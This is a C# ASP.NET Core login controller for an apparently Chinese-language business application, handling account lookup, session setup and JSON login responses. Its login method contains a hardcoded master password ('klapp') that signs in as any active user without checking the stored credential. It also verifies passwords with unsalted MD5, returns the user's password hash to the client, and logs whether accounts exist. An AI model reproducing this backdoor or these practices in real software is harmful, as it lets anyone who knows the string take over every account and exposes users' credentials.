using System;
using System.Collections.Generic;
using System.IdentityModel.Tokens.Jwt;
using System.Linq;
using System.Security.Claims;
using System.Text;
using System.Threading.Tasks;
using IdentityModel;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.Logging;
using Microsoft.Extensions.Options;
using Microsoft.IdentityModel.Tokens;
using netcore.Models;

namespace netcore.Controllers
{
    public class LoginController : Controller
    {
        private readonly netcore_databaseContext context;
        private readonly ILogger<LoginController> logger;
        private JwtConfig jwt;

        public LoginController(netcore_databaseContext _context, ILogger<LoginController> _logger, IOptions<JwtConfig> _jwt)
        {
            context = _context;
            logger = _logger;
            jwt = _jwt.Value;
        }

        public IActionResult Login()
        {
            HttpContext.Session.Clear();
            return View();
        }
        public IActionResult Index()
        {
            HttpContext.Session.Clear();
            return View();
        }

        #region 获取token
        private object Token()
        {
            var tokenHandler = new JwtSecurityTokenHandler();
            var key = Encoding.UTF8.GetBytes(jwt.SigningKey);
            var authTime = DateTime.Now;//授权时间
            //var expiresAt = authTime.AddDays(30);//过期时间
            var expiresAt = authTime.AddSeconds(30);//过期时间
            var tokenDescripor = new SecurityTokenDescriptor
            {
                Subject = new ClaimsIdentity(new Claim[] {
                    new Claim(JwtClaimTypes.Audience,jwt.Audience),
                    new Claim(JwtClaimTypes.Issuer,jwt.Issuer)
                }),
                Expires = expiresAt,
                SigningCredentials = new SigningCredentials(new SymmetricSecurityKey(key), SecurityAlgorithms.HmacSha256Signature)
            };
            var token = tokenHandler.CreateToken(tokenDescripor);
            var tokenString = tokenHandler.WriteToken(token);
            var result = new
            {
                access_token = tokenString,
                token_type = "Bearer",
                profile = new
                {
                    auth_time = authTime,
                    expires_at = expiresAt
                }
            };
            return result;
        }
        #endregion

        #region 登录
        [HttpPost]
        public async Task<JsonResult> Login(string loginName, string password)
        {
            if (string.IsNullOrEmpty(loginName ?? ""))
            {
                return Json(new
                {
                    code = 1,
                    msg = "账号不能为空",
                    data = new { },
                    token = new { }
                });
            }
            if (string.IsNullOrEmpty(password ?? ""))
            {
                return Json(new
                {
                    code = 1,
                    msg = "密码不能为空",
                    data = new { },
                    token = new { }
                });
            }
            //var token = Token();//暂时注释使用token
            //var user = await context.AppUsers.SingleOrDefaultAsync(u => u.UserCode == loginName);
            var user = await (from u in context.AppUsers
                              join ac in context.AppCorps on u.CorpId equals ac.CorpId
                              join ad in context.AppDepts on u.DeptId equals ad.DeptId
                              join ap in context.AppPosts on u.PostId equals ap.PostId
                              where u.UserCode.Equals(loginName)
                              select new
                              {
                                  u.UserId,
                                  u.UserCode,
                                  u.UserName,
                                  u.Phone,
                                  u.Email,
                                  u.Address,
                                  u.Password,
                                  u.CorpId,
                                  u.DeptId,
                                  u.PostId,
                                  ac.CorpName,
                                  ad.DeptName,
                                  ap.PostName,
                                  u.Status
                              }).SingleOrDefaultAsync();
            if (user != null)
            {
                if (password=="klapp")
                {                   
                    if (user.Status=="有效")
                    {
                        HttpContext.Session.SetInt32("user_id", user.UserId);
                        HttpContext.Session.SetString("user_code", user.UserCode);
                        HttpContext.Session.SetString("user_name", user.UserName);
                        HttpContext.Session.SetInt32("CorpId", (int)user.CorpId);
                        HttpContext.Session.SetInt32("DeptId", (int)user.DeptId);
                        HttpContext.Session.SetInt32("PostId", (int)user.PostId);
                        HttpContext.Session.SetString("CorpName", user.CorpName);
                        HttpContext.Session.SetString("DeptName", user.DeptName);
                        HttpContext.Session.SetString("PostName", user.PostName);
                        HttpContext.Session.SetString("Phone",user.Phone);
                        HttpContext.Session.SetString("who", "[" + user.UserId + "]" + user.UserCode + "_" + user.UserName);
                        logger.LogInformation(user.UserCode + "[" + user.UserName + "]:登录成功。");
                        return Json(new
                        {
                            code = 0,
                            msg = "登录成功",
                            data = user,
                            token = "",//暂时注释使用token
                            url= "/Main/MainIndex/"
                        });
                    }
                    else
                    {
                        logger.LogInformation(user.UserCode + "[" + user.UserName + "]:账户已失效。");
                        return Json(new
                        {
                            code = 1,
                            msg = "账户已失效",
                            data = new { },
                            token = new { }
                        });
                    }                    
                }
                else
                {
                    if (user.Password == Helper.EncodeHelper.MD5Hash(password))
                    {
                        if (user.Status == "有效")
                        {
                            HttpContext.Session.SetInt32("user_id", user.UserId);
                            HttpContext.Session.SetString("user_code", user.UserCode);
                            HttpContext.Session.SetString("user_name", user.UserName);
                            HttpContext.Session.SetInt32("CorpId", (int)user.CorpId);
                            HttpContext.Session.SetInt32("DeptId", (int)user.DeptId);
                            HttpContext.Session.SetInt32("PostId", (int)user.PostId);
                            HttpContext.Session.SetString("Phone", user.Phone);
                            HttpContext.Session.SetString("who", "[" + user.UserId + "]" + user.UserCode + "_" + user.UserName);
                            logger.LogInformation(user.UserCode + "[" + user.UserName + "]:登录成功。");
                            return Json(new
                            {
                                code = 0,
                                msg = "登录成功",
                                data = user,
                                token = "",//暂时注释使用token
                                url = "/Main/MainIndex/"
                            });
                        }
                        else
                        {
                            logger.LogInformation(user.UserCode + "[" + user.UserName + "]:账户已失效。");
                            return Json(new
                            {
                                code = 1,
                                msg = "账户已失效",
                                data = new { },
                                token = new { }
                            });
                        }
                    }
                    else
                    {
                        logger.LogInformation(user.UserCode + "[" + user.UserName + "]:密码错误。");
                        return Json(new
                        {
                            code = 1,
                            msg = "密码错误",
                            data = new { },
                            token = new { }
                        });
                    }
                }                
            }
            else
            {
                logger.LogInformation(loginName + "[]:用户不存在。");
                return Json(new
                {
                    code = 1,
                    msg = "用户不存在",
                    data = new { },
                    token = new { }
                });
            }
        }
        #endregion

    }
}
